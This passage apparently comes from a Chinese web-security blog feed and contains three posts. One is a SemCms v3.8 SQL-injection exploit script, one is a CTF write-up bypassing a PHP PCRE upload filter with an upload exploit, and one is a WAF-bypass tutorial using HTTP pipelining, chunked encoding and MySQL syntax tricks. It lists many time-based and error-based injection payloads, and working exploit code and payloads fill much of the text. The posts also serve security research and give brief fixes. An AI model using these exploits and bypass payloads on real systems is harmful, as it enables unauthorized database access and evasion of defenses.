class="variable">g:</span>  http<span class="variable">s:</span>//boogle.github.io</span><br><span class="line">url = <span class="string">'http://127.0.0.1/semcms_php_v3.8/?languageIDD=1'</span></span><br><span class="line">payload_len = <span class="string">' and greatest(length(database()),0) like &#123;0&#125;'</span></span><br><span class="line">payload_database = <span class="string">'%20and%20greatest(ascii(substr(database(),&#123;0&#125;,1)),0)%20like%20&#123;1&#125;'</span></span><br><span class="line">payload_tag = <span class="string">'%20and%20greatest(ascii(substr(tag_newkey,&#123;0&#125;,1)),0)%20like%20&#123;1&#125;'</span></span><br><span class="line">#获取数据库长度</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">payload = url+payload_len.format(str(i))</span><br><span class="line">#print payload</span><br><span class="line"><span class="keyword">res</span> = requests.<span class="built_in">get</span>(payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'About Us'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] The databse length is '</span>+str(i)</span><br><span class="line">length = i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"># 获取数据库</span><br><span class="line">databse = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">j</span> in xrange(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">payload = url + payload_database.format(str(i),str(<span class="keyword">j</span>))</span><br><span class="line"><span class="keyword">res</span> = requests.<span class="built_in">get</span>(payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'About Us'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">databse += chr(<span class="keyword">j</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Payloading :'</span>+databse</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] The databse is '</span>+databse</span><br><span class="line">#获取tag_newkey字段内容</span><br><span class="line"><span class="keyword">tag</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">j</span> in xrange(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">payload = url + payload_tag.format(str(i),str(<span class="keyword">j</span>))</span><br><span class="line"><span class="keyword">res</span> = requests.<span class="built_in">get</span>(payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'We main manufacturer'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line"><span class="keyword">tag</span> += chr(<span class="keyword">j</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Payloading :'</span>+<span class="keyword">tag</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]tag_newkey '</span>+<span class="keyword">tag</span></span><br></pre></td></tr></table></figure></p><h2 id="0x05-修复方案"><a href="#0x05-修复方案" class="headerlink" title="0x05 修复方案"></a>0x05 修复方案</h2><p>传入的int类型参数使用<code>intval()</code>函数强制类型转换。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Bypass PCREWAF</title>
    <link href="https://zhengbao.wang/Bypass-PCREWAF/"/>
    <id>https://zhengbao.wang/Bypass-PCREWAF/</id>
    <published>2019-03-10T03:59:04.000Z</published>
    <updated>2019-03-10T04:03:38.979Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>起源于CODEBREAKING中一个ctf题目  <a href="https://code-breaking.com/puzzle/2/" target="_blank" rel="noopener">easy - pcrewaf</a><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_php($data)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    @mkdir($user_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>题目大意为向服务器写入一个php文件，但是文件内容收到了限制<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, <span class="variable">$data</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>正则匹配了php标签，也就是说我们无法写入php代码，常规绕过思路是使用ASP标签<code>&lt;% %&gt;</code>或者script PHP标签<code>&lt;script language=&quot;php&quot;&gt;</code>来区分php代码，但是题目环境使用php7版本，这两种标签均被移除。<br><img src="https://i.loli.net/2019/03/10/5c84838e186fa.png" alt></p><p><img src="https://i.loli.net/2019/03/10/5c8483b0a34d5.png" alt></p><p>这里，PHITHON大神提到了一种很好的方式：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><h2 id="0x02-利用pcre-backtrack-limit限制绕过pcrewaf"><a href="#0x02-利用pcre-backtrack-limit限制绕过pcrewaf" class="headerlink" title="0x02 利用pcre.backtrack_limit限制绕过pcrewaf"></a>0x02 利用pcre.backtrack_limit限制绕过pcrewaf</h2><p>常见正则有两种匹配形式</p><ul><li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li><li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li></ul><p>而php所使用的pcre库则采用了NFA方式</p><p>那么何为回溯呢？这里以此题的正则为例匹配<code>&lt;?php phpinfo();//booglewadwdadadwad</code><br><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;\?.*<span class="comment">[(`;?&gt;]</span>.*/<span class="keyword">is</span></span><br></pre></td></tr></table></figure></p><p>当其执行到第一个<code>.*</code>时，它会匹配到后面所有的内容<br><img src="https://i.loli.net/2019/03/10/5c848672a232d.png" alt><br>而继续执行到 <code>[(;?&gt;]</code>时，前面匹配的全部内容显然不符合，此时便会进行回溯。直到匹配到<code>;</code>时符合条件<br><img src="https://i.loli.net/2019/03/10/5c84882491e42.png" alt></p><p>那么这里便有一个问题，如果回溯时无关字符无限长，那么岂不是会导致正则永远无法执行完成，导致正则dos。<br>其实为了防止这种情况的发生，pcre对回溯次数做了限制，默认配置回溯次数<code>pcre.backtrack_limit</code>为1000000次。<br><img src="https://i.loli.net/2019/03/10/5c84890e8b30e.png" alt><br>当回溯次数超过一百万次时，会返回<code>false</code>,那么这个题目便可构造超长的回溯次数使其返回<code>false</code>绕过文件内容检查。</p><h2 id="0x03-payload"><a href="#0x03-payload" class="headerlink" title="0x03 payload"></a>0x03 payload</h2><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">from io <span class="keyword">import</span> BytesIO</span><br><span class="line">from hashlib <span class="keyword">import</span> md5</span><br><span class="line">file = &#123;</span><br><span class="line"><span class="string">'file'</span>:BytesIO(b<span class="string">'&lt;?php phpinfo();//'</span>+b<span class="string">'a'</span>*<span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.111.139:8088/'</span></span><br><span class="line">r=requests.post(url=url,files=file)</span><br><span class="line">m = md5()</span><br><span class="line">m.update(<span class="string">'192.168.111.1'</span>)</span><br><span class="line"><span class="built_in">path</span> = <span class="string">'/data/'</span>+m.hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> xrange(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">u = url+<span class="built_in">path</span>+<span class="string">'/'</span>+str(i)+<span class="string">'.php'</span></span><br><span class="line">res = requests.get(u)</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">print u</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/10/5c848a7415b9b.png" alt></p><h2 id="0x04-修复方法"><a href="#0x04-修复方法" class="headerlink" title="0x04 修复方法"></a>0x04 修复方法</h2><p>题目中使用了<code>preg_match</code>对字符串匹配，采用<code>===</code>判断返回值<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_php($input) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="params">...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;起源于CODEBREAKING中一个ctf题目  &lt;a href=&quot;https://code-bre
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="正则表达式" scheme="https://zhengbao.wang/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
      <category term="bypass" scheme="https://zhengbao.wang/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>从http协议层面和数据库层面绕过waf</title>
    <link href="https://zhengbao.wang/%E4%BB%8Ehttp%E5%8D%8F%E8%AE%AE%E5%B1%82%E9%9D%A2%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2%E7%BB%95%E8%BF%87waf/"/>
    <id>https://zhengbao.wang/从http协议层面和数据库层面绕过waf/</id>
    <published>2019-03-06T13:57:33.000Z</published>
    <updated>2019-03-07T03:31:49.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-http协议层面绕过waf"><a href="#0x01-http协议层面绕过waf" class="headerlink" title="0x01 http协议层面绕过waf"></a>0x01 http协议层面绕过waf</h2><p>此部分参考<a href="https://paper.tuisec.win/detail/0f99a840200952d" target="_blank" rel="noopener">在HTTP协议层面绕过WAF</a>、<a href="https://paper.tuisec.win/detail/1cb6e0e9ad3f25f" target="_blank" rel="noopener">利用分块传输吊打所有WAF</a></p><h3 id="http管道化pipeline"><a href="#http管道化pipeline" class="headerlink" title="http管道化pipeline"></a>http管道化pipeline</h3><p>http管道化允许多个http请求通过一个套接字同时被输出 ，而不用等待相应的响应。然后请求者就会等待各自的响应，这些响应是按照之前请求的顺序依次到达。因为多个请求可被同时传送，如果waf只检测第一个请求，而忽略后面的请求，便可被绕过。<br>下面介绍通过burpsuite同时发送多个请求<br>首先关闭<code>Update Content-Length</code><br><img src="https://i.loli.net/2019/03/02/5c7a2eddd9b8d.png" alt><br>然后修改<code>Connection</code>字段值为<code>keep-alive</code>,将多个请求包在数据段后面拼接即可，前面的数据包通过设置<code>Content-Length</code>字段，只会读取到指定的位置，剩下的数据将作为第二个请求。<br>可以看到服务端返回了两个Response,但第二个带有and关键字被安全狗拦截，说明该方法无法绕过安全狗，但不排除绕过其他waf的可能。<br><img src="https://i.loli.net/2019/03/02/5c7a2ec2333df.png" alt><br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">在进行环境测试时，发现php版本为`nts`时，服务端只会返回一个响应，原因未知。建议大家在遇到这种情况时可以更换`thread safe`版本</span><br></pre></td></tr></table></figure></p><h3 id="http分块传输"><a href="#http分块传输" class="headerlink" title="http分块传输"></a>http分块传输</h3><p>通过在数据包中添加<code>Transfer-Encoding: chunked</code>,标示报文采用分块编码。此时会忽略<code>Content-Length</code>字段设置。<br>此时数据部分为一系列分块，每个分块包含十六进制的长度值和数据，长度值与数据各占一行。最后用<code>0</code>标志分块结束并且最后紧跟两个换行。<br>可以看到该方法将关键字分块传输绕过了waf。<br><img src="https://i.loli.net/2019/03/02/5c7a3090c7062.png" alt><br>但是Imperva、360等WAF已经对Transfer-Encoding的分块传输做了处理，将分块组合成完整数据包进行分析，导致关键字被拦截。<br>此时可以通过在分块传输的长度标识后面添加<code>;</code>作为注释，随机添加注释内容，便可使waf无法识别。<br>另外对于加载在中间件上的插件<code>ModSecurity</code>，因为其不会解析http数据包内容，因此基于<code>ModSecurity</code>的waf产品用上述方法便无法绕过。<br>但是可以通过发送畸形的分块数据包，即使分块数据块出错，例如长度值与数据不符等，将攻击语句添加在url中。此时apache会因为畸形分块数据包而报错，导致<code>ModSecurity</code>不会处理错误的数据包，而apache强大的容错能力继续执行了可以解析的部分。<br><img src="https://i.loli.net/2019/03/02/5c7a6c6583632.png" alt></p><h3 id="http协议未覆盖"><a href="#http协议未覆盖" class="headerlink" title="http协议未覆盖"></a>http协议未覆盖</h3><p>http头中<code>Content-Type</code>字段一般可以设置三种参数提交形方式：<code>application/x-www-form-urlencoded</code>，<code>multipart/form-data</code>，<code>text/plain</code>。<br>当waf未能覆盖<code>multipart/form-data</code>提交方式时，或者waf认为其为文件上传请求，从而只检测文件上传，导致waf被绕过。<br><img src="https://i.loli.net/2019/03/02/5c7a703eadfb7.png" alt></p><h3 id="http字符集编码"><a href="#http字符集编码" class="headerlink" title="http字符集编码"></a>http字符集编码</h3><p>在<code>Content-Type</code>中可以使用<code>charset</code>定义字符集，如果基于规则引擎的waf未对相应字符集进行处理，则可以被绕过<br><img src="https://i.loli.net/2019/03/02/5c7a862ea9096.png" alt><br>burpsuite修改<code>charset</code>可自动encode。</p><h2 id="0x02-数据库层面绕过waf"><a href="#0x02-数据库层面绕过waf" class="headerlink" title="0x02 数据库层面绕过waf"></a>0x02 数据库层面绕过waf</h2><p>此部分参考<a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448903977&amp;idx=1&amp;sn=008229fe76b96e4a229a3a4144fcb284&amp;chksm=8b55df74bc225662a50c05b4e7a1a911e177e3e276658571c0438bba803a69fff0e1748f4812&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">WAF Bypass数据库特性（Mysql探索篇）</a><br>以<code>Mysql</code>数据库为例分析</p><p>例句形式常见有5个位置即：<code>SELECT * FROM admin WHERE username = 1【位置一】union【位置二】select【位置三】1,user()【位置四】from【位置五】admin</code></p><h3 id="通用空格替换符"><a href="#通用空格替换符" class="headerlink" title="通用空格替换符"></a>通用空格替换符</h3><ul><li>注释符<br>  <code>/**/</code>  <code>/*!00000union*/</code></li><li>空白符<br><code>%09</code>,<code>%0a</code>,<code>%0b</code>,<code>%0c</code>,<code>%0d</code><br>以上注释和空白符可用于所有位置<h3 id="位置一-union之前"><a href="#位置一-union之前" class="headerlink" title="位置一 union之前"></a>位置一 union之前</h3></li><li>浮点数  <code>1.0union</code> <code>1.union</code> 等形式</li><li>科学计数法 <code>1E0union</code></li><li>浮点数特殊形式 <code>%1.union</code> <code>%2.union</code> <code>%1%2eunion</code></li><li>\N形式 <code>\Nunion</code><h3 id="位置二-union和select之间"><a href="#位置二-union和select之间" class="headerlink" title="位置二 union和select之间"></a>位置二 union和select之间</h3></li><li><code>()</code>包裹select语句<h3 id="位置三-select之后"><a href="#位置三-select之后" class="headerlink" title="位置三 select之后"></a>位置三 select之后</h3></li><li>特殊字符 <code>!</code> <code>+</code> <code>-</code> <code>@</code> <code>~</code><br>上面字符除<code>@</code>外，可单个或随机自由数量组合使用 如<code>select!~!!!-+~@1,2,3</code></li><li>引号 <code>select&quot;1&quot;,2,3</code></li><li>\N形式 <code>select\N,2,3</code></li><li>花括号形式 <code>select{x 1},2,3</code><h3 id="位置四-from之前"><a href="#位置四-from之前" class="headerlink" title="位置四 from之前"></a>位置四 from之前</h3></li><li>浮点数 <code>select 1,2,3.0from</code> 或 <code>3.from</code></li><li>科学计数法 <code>select 1,2,3E0from</code></li><li>浮点数特殊形式 <code>%1.from</code> <code>%2.from</code> <code>%1%2efrom</code></li><li>\N形式 <code>select 1,2,\Nfrom</code></li><li>带括号的函数 如<code>select 1,2,user()from</code></li><li><p>破浪号     </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>`from</span><br></pre></td></tr></table></figure></li><li><p>破浪号后加任意字符串 </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>`booglefrom</span><br></pre></td></tr></table></figure></li><li><p>花括号形式 <code>select 1,2,{x 3}from</code></p><h3 id="位置五-from之后"><a href="#位置五-from之后" class="headerlink" title="位置五 from之后"></a>位置五 from之后</h3></li><li><p>破浪号 </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> from`user</span><br></pre></td></tr></table></figure></li><li><p>破浪号包裹 </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span><span class="symbol">`user`</span></span><br></pre></td></tr></table></figure></li><li><p>括号<code>()</code>包裹 <code>select 1,2,3 from(user)</code></p></li><li>花括号形式 <code>select 1,2,3 from{x user}</code></li><li>查询同一个表的情况下，可以加任意数字字母 <code>select * from user where id = -1 union select 1,user(),3 fromboogle123user</code><h3 id="等价函数"><a href="#等价函数" class="headerlink" title="等价函数"></a>等价函数</h3></li><li><p>字符串截取函数</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Mid(<span class="name">version</span>(),<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Substr(<span class="name">version</span>(),<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Substring(<span class="name">version</span>(),<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Lpad(<span class="name">version</span>(),<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Rpad(<span class="name">version</span>(),<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Left(<span class="name">version</span>(),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">reverse(<span class="name">right</span>(<span class="name">reverse</span>(<span class="name">version</span>()),<span class="number">1</span>))</span><br></pre></td></tr></table></figure></li><li><p>字符串连接函数</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">concat</span>(version(),<span class="string">'|'</span>,user());</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">concat_ws</span>(<span class="string">'|'</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li><li><p>延时注入相关函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1) sleep(5) </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>)=<span class="string">'g'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line">(<span class="number">2</span>) <span class="keyword">benchmark</span>(<span class="keyword">count</span>,expr)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>)=<span class="string">'t'</span>,(<span class="keyword">select</span> <span class="keyword">benchmark</span>(<span class="number">10000000</span>,<span class="keyword">md5</span>(<span class="string">'boogle'</span>))),<span class="number">1</span>)</span><br><span class="line">(<span class="number">3</span>) 计算笛卡尔积</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>)=<span class="string">'t'</span>,(<span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="number">1</span>)</span><br><span class="line">(<span class="number">4</span>) 正则bug(受mysql版本影响，部分不可行)</span><br><span class="line">        <span class="keyword">select</span> rpad(<span class="string">'a'</span>,<span class="number">4999999</span>,<span class="string">'a'</span>) <span class="keyword">RLIKE</span> <span class="keyword">concat</span>(<span class="keyword">repeat</span>(<span class="string">'(a.*)+'</span>,<span class="number">30</span>),<span class="string">'b'</span>)</span><br></pre></td></tr></table></figure></li><li><p>报错函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(1) 通过floor报错,注入语句如下:</span><br><span class="line">    and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"></span><br><span class="line">(2) 通过ExtractValue报错,注入语句如下:</span><br><span class="line">    and extractvalue(1, concat(0x5c, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">(3) 通过UpdateXml报错,注入语句如下:</span><br><span class="line">    and 1=(updatexml(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br><span class="line"><span class="number">4</span>、通过<span class="keyword">NAME_CONST</span>报错,注入语句如下:</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">0</span>))a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">0</span>))b)c);</span><br><span class="line">(5) 通过join报错爆字段,注入语句如下:（在知道数据库跟表名的情况下使用才可以爆字段）</span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> 表名 a <span class="keyword">join</span> 表名 b) c)</span><br><span class="line">    然后得到字段</span><br><span class="line">    如果想在爆下一个字段 就得加上<span class="keyword">using</span> (已知的字段）</span><br><span class="line">    在下一个字段</span><br><span class="line">    如果想在爆下一个字段 就得加上<span class="keyword">using</span> (已知的字段,已知的字段 ）</span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> 表名 a <span class="keyword">join</span> 表名 b <span class="keyword">using</span> (已知的字段,已知的字段 ） ) c)</span><br><span class="line">(<span class="number">6</span>) 通过<span class="keyword">exp</span>报错,注入语句如下:</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>() ) a) );</span><br><span class="line">(7) 通过GeometryCollection()报错,注入语句如下:</span><br><span class="line">    and geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">(8) 通过polygon ()报错,注入语句如下:</span><br><span class="line">    and polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">(9) 通过multipoint ()报错,注入语句如下:</span><br><span class="line">    and multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">(10) 通过multilinestring()报错,注入语句如下:</span><br><span class="line">    and multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">(11) 通过multipolygon()报错,注入语句如下:</span><br><span class="line">    and multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span 